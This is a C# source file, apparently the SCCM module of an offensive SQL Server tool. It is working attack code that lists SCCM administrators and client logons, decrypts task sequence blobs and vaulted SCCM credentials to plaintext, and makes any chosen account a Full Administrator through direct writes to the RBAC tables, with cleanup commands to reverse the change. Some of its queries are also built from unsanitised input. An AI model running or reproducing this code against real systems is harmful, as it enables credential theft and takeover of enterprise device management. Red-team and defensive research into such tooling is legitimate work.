using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Runtime.InteropServices;
using SQLRecon.Commands;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal class Sccm
    {
        private static GlobalVariables _gV = new();
        private static readonly PrintUtils _print = new();

        private static string _database = _gV.Database;
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// The SccmUsers method lists all users in the RBAC_Admins table. 
        /// These are all users configured for some level of access to SCCM.
        /// A check is performed to see if the current database is a SCCM database.
        /// </summary>
        /// <param name="con"></param>
        public void SccmUsers(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            _print.Status("High-Level SCCM User Listing:", true);
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(con,
                "select LogonName, AdminID, SourceSite, DistinguishedName from [dbo].[RBAC_Admins]"));

            Console.WriteLine();

            _print.Status("Detailed Permissions:", true);
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(con,
                "select LogonName, RoleName from [dbo].[v_SecuredScopePermissions]"));
        }

        /// <summary>
        /// The SccmSites method lists all sites stored in the SCCM databases' 'DPInfo' table.
        /// This can provide additional attack avenues as different sites 
        /// can be configured in different (insecure) ways.
        /// </summary>
        /// <param name="con"></param>
        public void SccmSites(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(con,
                "select * from [dbo].[DPInfo]"));
        }

        /// <summary>
        /// The SccmClientLogons method queries the 'Computer_System_DATA' table to 
        /// retrieve all associated SCCM clients along with the user that last logged into them.
        /// NOTE: This only updates once a week by default and will not be 100% up to date.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="filter"></param>
        public void SccmClientLogons(SqlConnection con, string filter)
        {
            string filterType = "";
            string[] filterObjs = null;
            //check for a filter and determine its type (if valid)
            if (filter != null)
            {
                bool validFilter = false;

                //parse first filter arg (filter type)
                try
                {
                    filterType = filter.Split(' ')[0].ToLower().Substring(0, 4);
                    if(filterType == "user" || filterType == "comp")
                    {
                        validFilter = true;
                    }
                }
                catch
                {}
                if(!validFilter)
                {
                    _print.Error("Invalid filter type. Valid filter types: user / computer");
                    return;
                }               

                //parse second filter arg (list of targets for filter)
                try
                {
                    filterObjs = filter.Split(' ')[1].Split(',');
                }
                catch
                {
                    _print.Error("Invalid filter object list. Provide a comma-seperated list of targets after the filter type");
                    return;
                }
            }

            if(filterType == "")
            {
                _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(con,
                    "select Name00, Username00 from [dbo].[Computer_System_DATA]"), true);
            }            
            else
            {
                StringBuilder sbQuery = new StringBuilder(
                    "select [dbo].[System_IP_Address_ARR].IP_Addresses0 as 'IP_Addr', [dbo].[Computer_System_Data].Name00 as 'Host', [dbo].[Computer_System_Data].UserName00 as 'User'" +
                    " from [dbo].[System_IP_Address_ARR],[dbo].[Computer_System_Data]" +
                    " where System_IP_Address_ARR.ItemKey = Computer_System_DATA.MachineID" +
                    " and System_IP_Address_ARR.NumericIPAddressValue > 0 and (");

                bool isFirst = true;
                foreach (string targetObj in filterObjs)
                {
                    if (!isFirst)
                    {
                        sbQuery.Append(" or ");
                    }
                    else
                    {
                        isFirst = false;
                    }
                    if (filterType == "user")
                    {
                        //check if user passed in user as domain\user
                        if(targetObj.IndexOf('\\') > -1)
                        {
                            sbQuery.Append(string.Format("Computer_System_Data.Username00 = '{0}'", targetObj));
                        }
                        else
                        {
                            sbQuery.Append(string.Format("Computer_System_Data.Username00 like '%\\{0}'", targetObj));
                        }
                    }
                    //else filter type == comp
                    else
                    {
                        sbQuery.Append(string.Format("Computer_System_Data.Name00 = '{0}'", targetObj));

                    }
                }
                sbQuery.Append(")");
                _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(con, sbQuery.ToString()), true);
            }
        }

        /// <summary>
        /// The SccmTaskSequenceList method provides a list of all task sequences stored
        /// in the SCCM database, but does not access the actual task data contents.
        /// </summary>
        /// <param name="con"></param>
        public void SccmTaskSequenceList(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(con,
                "select PkgID, Name from [dbo].[vSMS_TaskSequencePackage]"), true);
        }

        /// <summary>
        /// The GetTaskSequenceData method recovers all task sequences stored in the SCCM
        /// database and decrypts them to plaintext. Task sequences can contain credentials
        /// for joining systems to domains, mapping shares, running commands, etc.
        /// </summary>
        /// <param name="con"></param>
        public void GetTaskSequenceData(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            // Use custom request formatter so we can get bytes back.
            using (SqlCommand command = new ("select PkgID, Name, " +
                "Sequence from [dbo].[vSMS_TaskSequencePackage]", con))
            {
                using (SqlDataReader dataReader = command.ExecuteReader())
                {
                    if (dataReader.HasRows)
                    {
                        while (dataReader.Read())
                        {
                            byte[] hexEncodedBlob = dataReader.GetFieldValue<byte[]>(2);

                            _print.Status("Gathered encrypted task sequence blob.", true);
                            _print.Nested(string.Format("Task Sequence ID: " + dataReader.GetFieldValue<string>(0)), true);
                            _print.Nested(string.Format("Task Sequence Name: " + dataReader.GetFieldValue<string>(1)), true);
                            _print.Nested(string.Format("Attempting to decrypt task data:\r\n"), true);

                            string blobHexStr = Encoding.ASCII.GetString(hexEncodedBlob);
                            Console.WriteLine(_decodeData(_hexStrToBytes(blobHexStr))+"\r\n");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// The TriageVaultedCredentials method lists credentials vaulted by SCCM for
        /// use in various functions. These credentials can not be remotely decrypted
        /// as the key is stored on the SCCM server. However, this module provides
        /// intel on if it makes sense to attempt to obtain the key.
        /// </summary>
        /// <param name="con"></param>
        public void TriageVaultedCredentials(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            string sqlQuery = _sqlQuery.ExecuteCustomQuery(con, 
                "select UserName, Usage from [dbo].[vSMS_SC_UserAccount]");
            
            IEnumerable<string> accountListing = sqlQuery.Split('\n').Skip(2);

            if (!accountListing.Any())
            {
                Console.WriteLine("[+] No results.");
                // Go no further
                return;
            }
            else
            {
                foreach (string accountData in accountListing)
                {
                    string username = accountData.Split('|')[0].Trim();

                    _print.Status("Identified vaulted SCCM credential:", true);
                    _print.Nested(string.Format("Username: " + username), true);

                    string usage = accountData.Split('|')[1].Trim();

                    IEnumerable<string> uses = usage.Split(new string[] { "<UsageName>" }, StringSplitOptions.None).Skip(1);

                    foreach (string functionalRole in uses)
                    {
                        _print.Nested(string.Format("Function: " + functionalRole.Substring(0, functionalRole.IndexOf("</UsageName>"))), true);
                    }
                    Console.WriteLine();
                }
            }
            



        }

        /// <summary>
        /// The DecryptVaultedCredentials method recovers encrypted credential string
        /// for accounts vaulted in SCCM and attempts to use the Microsoft Systems Management Server CSP 
        /// to attempt to decrypt them to plaintext. Uses the logic from @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// This function must be ran from an SCCM management server in a context
        /// that has the ability to access this CSP (high-integrity admin or SYSTEM).
        /// </summary>
        /// <param name="con"></param>
        public void DecryptVaultedCredentials(SqlConnection con)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            string sqlQuery = _sqlQuery.ExecuteCustomQuery(con,
                "select UserName, Usage, Password from [dbo].[vSMS_SC_UserAccount]");

            IEnumerable<string> accountListing = sqlQuery.Split('\n').Skip(2);

            if (!accountListing.Any())
            {
                Console.WriteLine("[+] No results.");
                // Go no further
                return;
            }
            else
            { 
                foreach (string accountData in accountListing)
                {
                    string username = "";
                    try
                    {
                        username = accountData.Split('|')[0].Trim();
                        string passwordBlob = accountData.Split('|')[2].Trim();

                        _print.Status("Identified vaulted SCCM credential:", true);
                        _print.Nested(string.Format("Username: " + username), true);

                        if (DecryptSccm.DecryptSccmCredential(passwordBlob, out string plaintextPW))
                        {
                            _print.Nested(string.Format("Password: " + plaintextPW), true);
                        }
                        else
                        {
                            _print.Nested(string.Format("Failed To Recover Password. Error: " + plaintextPW), true);
                        }

                        string usage = accountData.Split('|')[1].Trim();

                        IEnumerable<string> uses = usage.Split(new string[] { "<UsageName>" }, StringSplitOptions.None).Skip(1);

                        foreach (string functionalRole in uses)
                        {
                            _print.Nested(string.Format("Function: " + functionalRole.Substring(0, functionalRole.IndexOf("</UsageName>"))), true);
                        }
                    
                        Console.WriteLine();
                    }
                    catch (Exception ex)
                    {
                        _print.Error(username + " does not have a password configured, or the stored password is inaccessible.", true);
                        Console.WriteLine(ex);
                    }                
                }
            }
        }

        /// <summary>
        /// The AddSCCMAdmin method will elevate the specified account to a 'Full Administrator'
        /// within SCCM. If target user is already an SCCM user, this module will instead add necessary
        /// privileges to elevate. This module require sysadmin or similar privileges as writing to 
        /// SCCM database tables is required.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="username"></param>
        /// <param name="sid"></param>
        public void AddSCCMAdmin(SqlConnection con, string username, string sid)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            byte[] sidBytes;

            sid = sid.ToUpper();

            // Use the current user.
            if (username.ToUpper().Equals("CURRENT"))
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                sidBytes = new byte[identity.User.BinaryLength];
                identity.User.GetBinaryForm(sidBytes, 0);
                username = identity.Name;
            }
            // Use username and SID passed in as args.
            else if (username.Contains("\\"))
            {
                string[] argsSplit = { username, sid };

                sid = argsSplit.FirstOrDefault(x => x.StartsWith("S-1-5", StringComparison.OrdinalIgnoreCase));

                // Verify that the SID contains a value that is expected
                if (sid == null)
                {
                    _print.Error("Invalid SID detected. " +
                        "Ensure it follows the standard 'S-1-5-...' format, or is set to 'current'.", true);
                    // Go no further.
                    return;
                }

                SecurityIdentifier targetUser = new (sid);
                sidBytes = new byte[targetUser.BinaryLength];
                targetUser.GetBinaryForm(sidBytes, 0);
                username = argsSplit.FirstOrDefault(x => x.ToUpper().IndexOf("S-1-5") == -1);

                // Check to see if the username contains a backslash (domain convention).
                if (!username.Contains("\\") || username == null)
                {
                    _print.Error("Invalid domain username format", true);
                    // Go no further.
                    return;
                }
            }
            else
            {
                _print.Error("Invalid domain username format. Ensure a valid username has been provided. " +
                    "Either 'DOMAIN\\USERNAME' or 'current'.", true);
                // Go no further.
                return;
            }
            
            sid = sid.ToUpper();
            
            // Get site code for target site, use this for source site.
            string siteCode = "";
            
            using (SqlCommand command = new ("select ThisSiteCode from [dbo].[v_Identification]", con))
            {
                using (SqlDataReader dataReader = command.ExecuteReader())
                {
                    if (dataReader.HasRows)
                    {
                        dataReader.Read();
                        siteCode = dataReader.GetFieldValue<string>(0);
                    }
                }
            }

            StringBuilder sb = new ("0x");
            
            foreach (byte b in sidBytes)
            {
                sb.Append(b.ToString("X2"));
            }

            int resCount = 0;
            string currentUserSid = "";
            string currentUserID = "";
            string currentUserLogonName = username;
            bool SMS00001 = false;
            bool SMS00004 = false;
            bool SMS00ALL = false;

            /* 
             * Before adding user, check to see if they already exist in RBAC_Admins.
             * If they exist, get current permissions for the account and display so
             * they can be maintained after removing additional admin privs.
             */

            using (SqlCommand command = new ("Select AdminID, AdminSID, LogonName from [dbo].[RBAC_Admins] where AdminSID = CAST(@data as VARBINARY)", con))
            {
                command.Parameters.Add(new SqlParameter("@data", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                
                using (SqlDataReader dataReader = command.ExecuteReader())
                {
                    // Check if target user already exists in SCCM.
                    if (dataReader.HasRows)
                    {
                        while (dataReader.Read())
                        {
                            resCount++;
                            currentUserSid = BitConverter.ToString(dataReader.GetFieldValue<byte[]>(1)).ToUpper();
                            
                            try
                            {
                                currentUserID = dataReader.GetFieldValue<int>(0).ToString();
                                currentUserLogonName = dataReader.GetFieldValue<string>(2);
                                _print.Status(string.Format("Target user already exists in SCCM user table (logon name:{0}). " +
                                    "Adding permissions to existing account.", currentUserLogonName), true);
                            }
                            catch (Exception e)
                            {
                                _print.Error(string.Format("Unable to retrieve user data: {0}.", e.ToString()), true);
                                // Go no further.
                                return;
                            }
                        }
                        
                        if (resCount > 1) 
                        {
                            _print.Error(string.Format("{0} matching entries for target SID identified, " +
                                "choose different user or delete one of these entries.", resCount), true);
                            // Go no further.
                            return;
                        }                        
                    }
                }
            }

            if (resCount == 1)
            {
                // Here we know we are dealing with a current user that has
                // exactly 1 entry in the admin list, assess their current privs.
                string targetUserCurrentPrivs = _sqlQuery.ExecuteCustomQuery(con, 
                    string.Format("select ScopeID,RoleID from [dbo].[RBAC_ExtendedPermissions] where AdminID = '{0}'", currentUserID));
                
                // If target user has no privs assigned.
                if (targetUserCurrentPrivs == "")
                {
                    _print.Status("Target user does not appear to have any privileges assigned.", true);
                }
                // Else build out command so that current privileges can be restored to prior state at a later time.
                else
                {
                    IEnumerable<string> accountPrivileges = targetUserCurrentPrivs.Split('\n').Skip(2);
                    
                    foreach (string privilege in accountPrivileges)
                    {
                        string scopeID = privilege.Split('|')[0].Trim();
                        string roleID = privilege.Split('|')[1].Trim();
                        
                        // Check for existing privileges that intersect with the three we need to add.
                        if (scopeID == "SMS00ALL" && roleID == "SMS0001R")
                        {
                            SMS00ALL = true;
                        }
                        if (scopeID == "SMS00004" && roleID == "SMS0001R")
                        {
                            SMS00004 = true;
                        }
                        if (scopeID == "SMS00001" && roleID == "SMS0001R")
                        {
                            SMS00001 = true;
                        }
                    }

                    // Check if target user is already a full admin. If so, exit as we dont need to do anythiung further.
                    if (SMS00ALL && SMS00004 && SMS00001)
                    {
                        _print.Error("Target user appears to already be a 'Full Administrator' in SCCM.", true);
                        // Go no further.
                        return;
                    }

                    _print.Status("Target user already has some privileges assigned.", true);
                }

                StringBuilder compiledPrivs = new ();
                if (!SMS00ALL)
                {
                    compiledPrivs.Append(string.Format("{0}|{1},", "SMS00ALL", "SMS0001R"));
                }
                if(!SMS00004)
                {
                    compiledPrivs.Append(string.Format("{0}|{1},", "SMS00004", "SMS0001R"));
                }
                if(!SMS00001)
                {
                    compiledPrivs.Append(string.Format("{0}|{1},", "SMS00001", "SMS0001R"));
                }
                if (compiledPrivs.Length > 0)
                {
                    compiledPrivs.Length--;
                }
                _print.Status(string.Format("Use the this command to restore the account to its prior state: \"/database:{0} /module:sRemoveAdmin /user:{1} /remove:{2}\"",
                    _database, currentUserID, compiledPrivs.ToString()), true);

            }
            // Else target user does not currently exist in SCCM.
            else if (resCount== 0)
            {
                SqlParameter adminSID = new ("@adminSID", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes };
                using (SqlCommand sqlCommand = new (string.Format("INSERT INTO RBAC_Admins(AdminSID,LogonName,DisplayName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (@adminSID,'{0}','{1}',0,0,'','','','','{2}')", username, username.Split('\\')[1], siteCode), con))
                {
                    sqlCommand.Parameters.Add(new SqlParameter("@adminSID", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                    try
                    {
                        sqlCommand.ExecuteNonQuery();
                    }
                    catch (Exception e)
                    {
                        _print.Error(string.Format("Unable to add user to the 'RBAC_Admins' table: {0}.", e.ToString()), true);
                        // Go no further.
                        return;
                    }
                }              

                // Now that user has been added, query once more to get their adminID for adding privileges.
                using (SqlCommand command = new ("Select AdminID from [dbo].[RBAC_Admins] where AdminSID = CAST(@data as VARBINARY)", con))
                {
                    command.Parameters.Add(new SqlParameter("@data", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                    using (SqlDataReader dataReader = command.ExecuteReader())
                    {
                        // If target user already exists in SCCM 
                        if (dataReader.HasRows)
                        {
                            dataReader.Read();
                            currentUserID = dataReader.GetFieldValue<int>(0).ToString();
                        }
                        else
                        {
                            _print.Error("User does not appear to have been successfully added to the 'RBAC_Admins' table.", true);
                            // Go no further.
                            return;
                        }
                    }
                }

                _print.Success("Added target user to RBAC_Admins table.", true);
                _print.Status(string.Format("Use the this command to remove the account: \"/database:{0} /module:sRemoveAdmin /user:{1} /remove:00000000|00000000\"", _database, currentUserID), true);
            }

            // At this point the targetuser is in the RBAC_Admins table either
            // via us adding them or via them previously existing, so add privs to make them a full admin
            string permissions = "INSERT INTO [dbo].[RBAC_ExtendedPermissions] (AdminID,RoleID,ScopeID,ScopeTypeID) Values";

            if (!SMS00ALL)
            {
                 permissions += string.Format("({0}, 'SMS0001R', 'SMS00ALL', '29'),",currentUserID);
            }
            if (!SMS00004)
            {
                permissions += string.Format("({0}, 'SMS0001R', 'SMS00004', '1'),", currentUserID);
            }
            if (!SMS00001)
            {
                permissions += string.Format("({0}, 'SMS0001R', 'SMS00001', '1'),", currentUserID);
            }
            // Remove trailing comma
            permissions = permissions.Remove(permissions.Length - 1,1);

            // Add privileges
            string permissionRes = _sqlQuery.ExecuteCustomQuery(con, permissions);

            if (permissionRes != "")
            {
                _print.Error(string.Format("Unable to add permissions on target user account: {0}.", permissionRes), true);
                // Go no further.
                return;
            }

            _print.Success(string.Format("Assigned permissions to '{0}'. The user should now be a 'Full Administrator' in SCCM.", currentUserLogonName), true);
        }

        /// <summary>
        /// The RemoveSCCMAdmin method removes the privileges of a user by removing a newly 
        /// added user entirely from the SCCM database. If the user already existed in some capacity
        /// the RemoveSCCMAdmin method just removes the three roles that were added to the account
        /// via writes to the permission table. Use the arguments provided by output of the 
        /// AddSCCMAdmin command to run this command. This module require sysadmin or 
        /// similar privileges as writing to SCCM database tables is required.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adminID"></param>
        /// <param name="removeString"></param>
        public void RemoveSCCMAdmin(SqlConnection con, string adminID, string removeString)
        {
            if (_checkDatabase() == false)
                // Go no further
                return;

            bool removeAccount = false;
      
            if (removeString.IndexOf("00000000|00000000") > -1)
            {
                removeAccount = true;
            }

            // Build string to remove privileges.
            StringBuilder removePrivsStr = new ("Delete from [dbo].[RBAC_ExtendedPermissions] where ");
            
            bool privsAdded = false;

            if (removeString.IndexOf("SMS00ALL|SMS0001R") > -1 || removeAccount)
            {
                removePrivsStr.Append(string.Format("(AdminID={0} and ScopeID = 'SMS00ALL' and RoleID = 'SMS0001R' and ScopeTypeID = '29')", adminID));
                privsAdded = true;
            }
            
            if (removeString.IndexOf("SMS00004|SMS0001R") > -1 || removeAccount)
            {
                if (privsAdded)
                {
                    removePrivsStr.Append(" or ");
                }
                removePrivsStr.Append(string.Format("(AdminID={0} and ScopeID = 'SMS00004' and RoleID = 'SMS0001R' and ScopeTypeID = '1')", adminID));
                privsAdded = true;

            }
            
            if (removeString.IndexOf("SMS00001|SMS0001R") > -1 || removeAccount)
            {
                if (privsAdded)
                {
                    removePrivsStr.Append(" or ");
                }
                removePrivsStr.Append(string.Format("(AdminID={0} and ScopeID = 'SMS00001' and RoleID = 'SMS0001R' and ScopeTypeID = '1')", adminID));
            }

            // Attempt to remove privileges.
            string removePrivsOutput = _sqlQuery.ExecuteCustomQuery(con, removePrivsStr.ToString());

            if (removePrivsOutput != "")
            {
                _print.Error(string.Format("Something went wrong when attempting to remove privileges " +
                    "from '{0}' in the 'RBAC_ExtendedPermissions' table.", removePrivsOutput), true);
                // Go no further.
                return;
            }

            _print.Success(string.Format("Removed privileges from {0}.", adminID), true);

            // Check if we need to remove account from RBAC_Admins as well
            if (removeAccount)
            {
                string removeAccountOutput = _sqlQuery.ExecuteCustomQuery(con, string.Format("Delete from [dbo].[RBAC_Admins] where AdminID={0}", adminID));

                if (removeAccountOutput != "")
                {
                    _print.Error(string.Format("Something went wrong when attempting to remove user from the 'RBAC_Admins' table. {0}.", removePrivsOutput), true);
                    // Go no further.
                    return;
                }
                _print.Success(string.Format("Removed user with AdminID of '{0}' from the 'RBAC_Admins' table.", adminID), true);
            }
            _print.Success("All cleanup actions completed.", true);
        }

        /// <summary>
        /// The _checkDatabase method checks to see if a valid SCCM database has been supplied
        /// through determining if the 'RBAC_Admins' table exists.
        /// </summary>
        /// <returns></returns>
        private bool _checkDatabase()
        {
            string sqlOutput = _sqlQuery.ExecuteCustomQuery(_gV.Connect,
                "select count (*) from (select name from sys.tables where name = 'RBAC_Admins') as subquery");

            // The returned string should be a 1-entry table that includes the count of tables with a name of 'RBAC_Admins'
            // which should be '1' or '0' depending if we have the correct db or not.

            if (sqlOutput[sqlOutput.Length - 3] != '1')
            {
               _print.Error(string.Format("The database '{0}' does contain the 'RBAC_Admins' " +
                   "table. This indicates that the database is not an SCCM database, or your account " +
                   "does not have sufficient privileges to view all SCCM tables.", _database), true);
                    
               // Go no further.
               return false;
           }
           
            // Good to go.
            return true;
        }

        /// <summary>
        /// Reference: https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        /// </summary>
        /// <param name="hexStr"></param>
        /// <returns></returns>
        private static byte[] _hexStrToBytes(string hexStr)
        {
            byte[] retVal = new byte[hexStr.Length / 2];

            for (int i = 0; i < hexStr.Length >> 1; ++i)
            {
                retVal[i] = (byte)((_getHexVal(hexStr[i << 1]) << 4) + (_getHexVal(hexStr[(i << 1) + 1])));
            }

            return retVal;
        }

        /// <summary>
        /// The _getHexVal method gets the hex value.
        /// </summary>
        /// <param name="hex"></param>
        /// <returns></returns>
        private static int _getHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }

        /// <summary>
        /// The _decodeData method decodes agent tasking.
        /// </summary>
        /// <param name="encryptedBlob"></param>
        /// <returns></returns>
        private static string _decodeData(byte[] encryptedBlob)
        {
            // At offset 52 in the blob is a dword that contains the length of the contained data.
            // This data always begins at offset 64 in the blob.
            UInt32 dataLen = BitConverter.ToUInt32(encryptedBlob, 52);
            byte[] encryptedData = new byte[dataLen];
            Array.Copy(encryptedBlob, 64, encryptedData, 0, dataLen);

            // Key data used to decode the blob consists of 40 bytes that begin at offset 4 within the blob.
            byte[] hashBase = new byte[40];
            Array.Copy(encryptedBlob, 4, hashBase, 0, 40);

            // This initial data is used to derive the key that is in turn used to decrypt the data in the blob.
            PasswordDeriveBytes pdb = new PasswordDeriveBytes(hashBase, null);
            byte[] pwIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = pdb.CryptDeriveKey("TripleDES", "SHA1", 192, pwIV);

            using (TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider())
            {
                tdes.Key = key;
                tdes.Mode = CipherMode.CBC;
                tdes.Padding = PaddingMode.PKCS7;
                tdes.IV = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                byte[] decrypted = null;
                try
                {
                    ICryptoTransform ic = tdes.CreateDecryptor();
                    decrypted = ic.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
                finally
                {
                    tdes.Clear();
                }
                return (Encoding.Unicode.GetString(decrypted));
            }
        }
    }

    /// <summary>
    /// The following class is adopted from @XPN's SCCM Decryption PoC Gist: 
    /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
    /// </summary>
    internal class DecryptSccm
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, int Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen);

        [DllImport(@"advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptImportKey(IntPtr hProv, byte[] pbKeyData, UInt32 dwDataLen, IntPtr hPubKey, UInt32 dwFlags, ref IntPtr hKey);

        /// <summary>
        /// @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// </summary>
        /// <param name="credentialBlob"></param>
        /// <param name="plaintextPW"></param>
        /// <returns></returns>
        public static bool DecryptSccmCredential(string credentialBlob, out string plaintextPW)
        {
            IntPtr kHandle = IntPtr.Zero;
            IntPtr context = IntPtr.Zero;
            byte[] keyLengthBuffer = new byte[4];
            byte[] decryptedLengthBuffer = new byte[4];
            byte[] key;
            byte[] crypted;
            byte[] inputData;
            uint cryptLength;

            inputData = _strToByteArr(credentialBlob);
            if (inputData == null)
            {
                plaintextPW = "[!] Input string not in correct format, skipping.";
                return false;
            }
            Array.Copy(inputData, 0, keyLengthBuffer, 0, 4);
            int keyLength = BitConverter.ToInt32(keyLengthBuffer, 0);

            Array.Copy(inputData, 4, decryptedLengthBuffer, 0, 4);
            int decryptedLength = BitConverter.ToInt32(decryptedLengthBuffer, 0);

            cryptLength = (uint)(inputData.Length - 8 - (keyLength));

            key = new byte[keyLength];
            Array.Copy(inputData, 8, key, 0, keyLength);

            if (!CryptAcquireContext(ref context, "Microsoft Systems Management Server", "Microsoft Enhanced RSA and AES Cryptographic Provider", (uint)0x18, 96U) && !CryptAcquireContext(ref context, "Microsoft Systems Management Server", null, (uint)0x18, 104U))
            {
                uint lastWin32Error = (uint)Marshal.GetLastWin32Error();
                plaintextPW = string.Format("CryptAcquireContext failed with HRESULT {0}", lastWin32Error);
                return false;
            }

            if (!CryptImportKey(context, key, (uint)keyLength, IntPtr.Zero, 0, ref kHandle))
            {
                uint lastWin32Error2 = (uint)Marshal.GetLastWin32Error();
                plaintextPW = string.Format("CryptImportKey failed with HRESULT {0}", lastWin32Error2);
                return false;
            }

            crypted = new byte[cryptLength];
            Array.Copy(inputData, 8 + keyLength, crypted, 0, inputData.Length - 8 - (keyLength));

            if (!CryptDecrypt(kHandle, IntPtr.Zero, 1, 0, crypted, ref cryptLength))
            {
                uint lastWin32Error3 = (uint)Marshal.GetLastWin32Error();
                plaintextPW = string.Format("CryptDecrypt failed with HRESULT {0}", lastWin32Error3);
                return false;
            }

            plaintextPW = System.Text.Encoding.ASCII.GetString(crypted, 0, (int)cryptLength);
            return true;
        }

        /// <summary>
        /// Needed for @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// </summary>
        /// <param name="inputString"></param>
        /// <returns></returns>
        private static byte[] _strToByteArr(string inputString)
        {
            List<byte> inputDataList = new List<byte>();

            if (inputDataList.Count % 2 != 0)
            {
                return null;
            }

            for (int i = 0; i < inputString.Length; i += 2)
            {
                byte t = Convert.ToByte(inputString.Substring(i, 2), 16);
                inputDataList.Add(t);
            }

            return inputDataList.ToArray();
        }
    }
}
